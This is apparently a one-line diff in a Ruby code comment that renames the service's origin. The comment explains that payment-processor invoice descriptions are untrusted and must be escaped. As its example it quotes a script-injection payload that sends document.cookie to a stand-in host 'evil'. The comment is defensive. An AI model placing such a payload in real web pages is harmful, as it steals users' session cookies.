@@ -22,7 +22,7 @@ module V1
   # `charge.description` is **the processor's own text**: an invoice line item's
   # description, which this service never validates and cannot. A Stripe account
   # with a price called `<script>fetch('//evil/'+document.cookie)</script>`
-  # would otherwise put that script in a page served from cafaye's own origin,
+  # would otherwise put that script in a page served from anywaye's own origin,
   # inside a page a customer opens precisely when they trust us most. The same
   # applies to every id rendered here.
   #
